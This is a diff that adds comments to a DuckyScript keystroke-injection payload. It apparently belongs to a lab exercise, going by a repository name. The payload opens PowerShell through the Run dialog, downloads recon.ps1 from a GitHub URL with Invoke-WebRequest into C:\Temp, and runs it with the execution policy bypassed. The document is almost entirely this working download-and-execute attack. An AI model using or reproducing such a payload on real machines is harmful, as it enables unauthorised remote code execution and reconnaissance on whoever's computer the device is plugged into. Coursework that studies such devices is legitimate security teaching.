@@ -1,29 +1,37 @@
+REM === START ===
 DELAY 1500
+REM === Open PowerShell ===
 GUI r
 DELAY 500
 STRING powershell -NoProfile
 ENTER
 DELAY 1000
 
+REM === Define Link to Script ===
 STRING $u="https://raw.githubusercontent.com/butlersl/305-lab-files/main/Recon-Payload/recon.ps1"
 ENTER
 DELAY 300
 
+REM === Define Working Directory
 STRING $dir="C:\Temp"
 ENTER
 DELAY 300
 
+REM === Ensure Directory Exists ===
 STRING New-Item -ItemType Directory -Force -Path $dir | Out-Null
 ENTER
 DELAY 500
 
+REM === Define Script Path ===
 STRING $p="C:\Temp\recon.ps1"
 ENTER
 DELAY 300
 
+REM === Download Scrip ===
 STRING Invoke-WebRequest -Uri $u -OutFile $p
 ENTER
 DELAY 1500
 
+REM === Execute Script
 STRING powershell -NoProfile -ExecutionPolicy Bypass -File $p -DuckyDrive $dir
 ENTER
